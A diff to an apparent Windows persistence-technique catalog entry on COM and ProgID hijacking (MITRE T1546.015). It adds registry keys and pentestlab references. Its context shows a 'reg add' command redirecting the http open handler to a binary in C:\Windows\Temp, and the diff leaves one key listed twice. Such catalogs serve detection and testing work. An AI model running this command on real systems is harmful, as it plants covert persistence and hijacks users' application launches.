@@ -7,12 +7,13 @@ mitre_ids:
   - T1546.015
   - T1546.001
 keys:
-  - 'HKLM\SOFTWARE\Classes'
-  - 'HKCU\SOFTWARE\Classes'
   - 'HKCR\CLSID'
+  - 'HKCU\SOFTWARE\Classes'
   - 'HKCU\SOFTWARE\Classes\CLSID'
+  - 'HKCR\CLSID'
 resources:
   - link: https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm
+  - link: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/
   - link: https://attack.mitre.org/techniques/T1546/015/
 use_cases:
   - title: "COM Hijacking via InProcServer32"
@@ -31,3 +32,5 @@ use_cases:
     description: "Hijacks a ProgID to redirect application launches to a malicious binary."
     code: |
       reg add "HKCU\SOFTWARE\Classes\http\shell\open\command" /ve /t REG_SZ /d "C:\Windows\Temp\browser.exe %1" /f
+credits:
+  - link: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/
